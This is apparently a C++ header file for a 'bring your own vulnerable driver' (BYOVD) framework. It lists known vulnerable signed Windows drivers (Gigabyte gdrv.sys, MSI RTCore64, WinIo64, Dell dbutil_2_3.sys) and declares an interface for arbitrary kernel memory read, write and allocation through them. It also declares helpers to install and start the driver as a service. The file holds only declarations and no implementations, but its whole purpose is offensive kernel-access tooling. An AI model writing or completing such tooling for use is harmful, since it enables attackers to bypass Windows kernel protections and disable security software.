#pragma once
#include <windows.h>
#include <string>
#include <cstdint>
#include <vector>
#include <memory>

namespace hinv {
namespace byovd {

// Supported vulnerable-driver backends. Add more here as you integrate them.
enum class BackendType {
    Unknown = 0,
    GDrv,       // Gigabyte GDRV (gdrv.sys)  - arbitrary kernel virt read/write
    RTCore64,   // MSI Afterburner RTCore64  - physical map/read/write
    WinIo64,    // WinIo / RWEverything style
    DbUtil,     // Dell dbutil_2_3.sys       - arbitrary kernel virt read/write
};

struct DriverProfile {
    BackendType type;
    std::wstring serviceName;
    std::wstring devicePath;          // e.g. L"\\\\.\\GDrvDriver"
    std::wstring driverFileName;      // e.g. L"gdrv.sys"
    DWORD        readIoc;
    DWORD        writeIoc;
    DWORD        mapIoc;
    DWORD        unmapIoc;
};

// Generic kernel read/write primitive. Implemented per backend.
class IByovdBackend {
public:
    virtual ~IByovdBackend() = default;

    virtual bool Initialize(const std::wstring& driverPath) = 0;
    virtual void Shutdown() = 0;
    virtual bool IsReady() const = 0;

    virtual bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) = 0;
    virtual bool WriteKernelMemory(uint64_t kernelVa, const void* in, size_t size) = 0;

    // Allocate contiguous physical memory visible from kernel. Optional.
    virtual bool AllocateKernelMemory(size_t size, uint64_t& outKernelVa) {
        (void)size; (void)outKernelVa;
        return false;
    }
};

// Returns a profile for known driver names.
DriverProfile DetectProfile(const std::wstring& driverFileName);

// Create a backend instance for the given profile. Caller owns the pointer.
std::unique_ptr<IByovdBackend> CreateBackend(const DriverProfile& profile);

// Convenience: load a vulnerable driver and create the appropriate backend.
std::unique_ptr<IByovdBackend> LoadVulnerableDriver(const std::wstring& driverPath);

// Service helpers.
bool InstallDriverService(const std::wstring& serviceName, const std::wstring& driverPath);
bool StartDriverService(const std::wstring& serviceName);
bool StopDriverService(const std::wstring& serviceName);
bool RemoveDriverService(const std::wstring& serviceName);

} // namespace byovd
} // namespace hinv
